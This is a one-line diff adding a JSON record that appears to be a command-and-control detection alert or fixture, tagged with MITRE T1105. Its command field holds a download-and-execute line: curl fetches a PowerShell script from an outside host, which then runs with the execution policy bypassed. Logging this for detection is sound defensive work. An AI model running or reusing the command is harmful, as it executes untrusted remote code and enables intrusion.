@@ -1,0 +1,1 @@
+{"timestamp": "2026-10-16T23:57:43+00:00", "rule": "c2", "level": "high", "computer": "PC", "command": "curl -s http://cdn-updates.win/agent.ps1 -o a.ps1 & powershell -ep bypass -f a.ps1", "techniques": ["T1105"]}
